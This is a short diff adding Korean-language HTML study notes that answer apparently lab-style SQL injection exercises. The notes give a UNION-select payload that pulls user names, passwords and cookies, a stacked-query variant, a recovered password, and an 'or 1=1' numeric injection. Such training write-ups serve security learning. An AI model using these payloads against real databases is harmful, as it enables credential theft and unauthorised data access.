@@ -1,0 +1,29 @@
+
+<h1>3</h1>
+<div>
+    Q) CREATE TABLE user_system_data (userid int not null primary key,
+    user_name varchar(12),
+    password varchar(10),
+    cookie varchar(30));
+    a) UNION 혹은 JOIN으로 테이블 결합하라.
+    b) dave의 패스워드는?
+</div>
+<div>
+    a-A) Smith' union select userid, user_name, password, cookie, null, null, null from user_system_data --
+    또는 '; select * from user_system_data --
+    Smith를 검색해서 총 몇개 컬럼인지 먼저 알아내기.
+    이후 union 을 컬럼 갯수에 맞게(총 7개임) 조회해서 정보 확인.
+    아래 문제의 패스워드 때문에 컬럼에 password가 꼭 들어가야함.
+    a-B) passW0rD
+</div>
+
+
+<h1>5</h1>
+<div>
+    Q) "select * from users where USERID = " + userID; 
+    전체 사용자 정보 알아내기. (마찬가지로 단순 동적 쿼리고, numeric 임)
+</div>
+<div>
+    A) 101 or 1=1
+    numeric이므로 별도 형변환이 필요없음
+</div>
